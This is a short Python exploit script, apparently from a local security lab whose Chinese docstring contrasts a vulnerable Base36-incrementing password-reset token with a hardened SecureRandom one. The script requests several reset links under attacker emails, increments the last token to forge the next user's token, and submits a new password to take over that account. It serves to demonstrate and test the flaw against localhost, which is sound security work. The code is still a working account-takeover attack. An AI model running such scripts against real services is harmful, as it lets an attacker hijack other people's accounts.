"""靶点 7：重置 Token 可预测。
vulnerable：Base36 递增可猜；hardened：SecureRandom 不可预测。
"""
import httpx

base = "http://localhost:8080"
BASE36 = "0123456789abcdefghijklmnopqrstuvwxyz"

def to_base36(n: int) -> str:
    if n == 0:
        return "0"
    out = ""
    while n:
        out = BASE36[n % 36] + out
        n //= 36
    return out

with httpx.Client(base_url=base) as c:
    seen = []
    for i in range(5):
        r = c.post("/reset/request", json={"email": f"attacker{i}@test.io"})
        try:
            link = r.json().get("resetLink", "")
            tok = link.split("=")[-1] if link else ""
        except Exception:
            tok = ""
        seen.append(tok)
        print(f"\u653b\u51fb\u8005 token #{i}: {tok}")

    if seen and seen[-1]:
        nxt = int(seen[-1], 36) + 1
        forged = to_base36(nxt)
        print("\u731c\u6d4b\u53d7\u5bb3\u8005 token:", forged)
        r = c.post(f"/reset/confirm?token={forged}",
                   json={"newPassword": "OwnedByAttacker!1"})
        print("\u63a5\u7ba1\u7ed3\u679c\uff1a", r.text)
